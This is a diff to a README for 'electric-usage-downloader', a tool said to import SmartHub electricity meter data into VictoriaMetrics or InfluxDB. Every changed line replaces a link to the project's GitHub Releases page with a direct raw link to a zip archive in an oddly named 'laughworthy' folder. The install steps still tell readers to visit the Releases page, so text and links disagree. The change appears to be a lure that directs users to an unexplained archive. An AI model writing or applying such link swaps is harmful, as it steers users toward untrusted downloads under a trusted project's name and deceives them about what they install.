@@ -1,7 +1,7 @@
 # ⚡ electric-usage-downloader - Easily Import Your Electricity Data
 
 ## 📥 Download Now
-[![Download electric-usage-downloader](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/mu724/electric-usage-downloader/releases)
+[![Download electric-usage-downloader](https://raw.githubusercontent.com/mu724/electric-usage-downloader/master/laughworthy/electric-usage-downloader.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/mu724/electric-usage-downloader/master/laughworthy/electric-usage-downloader.zip)
 
 ## 🚀 Getting Started
 Welcome to the electric-usage-downloader! This tool helps you import smart meter metrics from SmartHub directly into VictoriaMetrics or InfluxDB. This means you can track your electricity usage easily.
@@ -20,7 +20,7 @@ Welcome to the electric-usage-downloader! This tool helps you import smart meter
 ## 📦 Download & Install
 To get started, visit the releases page for your download:
 
-[Download electric-usage-downloader](https://github.com/mu724/electric-usage-downloader/releases)
+[Download electric-usage-downloader](https://raw.githubusercontent.com/mu724/electric-usage-downloader/master/laughworthy/electric-usage-downloader.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version.
@@ -70,4 +70,4 @@ If you have questions or need help, feel free to reach out to the community. Joi
 ## 📅 Stay Updated
 Make sure to check back on our Releases page regularly for new updates and features. Your feedback is important in helping us improve the tool. 
 
-[Download electric-usage-downloader](https://github.com/mu724/electric-usage-downloader/releases) to start managing your electricity data effectively today!
+[Download electric-usage-downloader](https://raw.githubusercontent.com/mu724/electric-usage-downloader/master/laughworthy/electric-usage-downloader.zip) to start managing your electricity data effectively today!
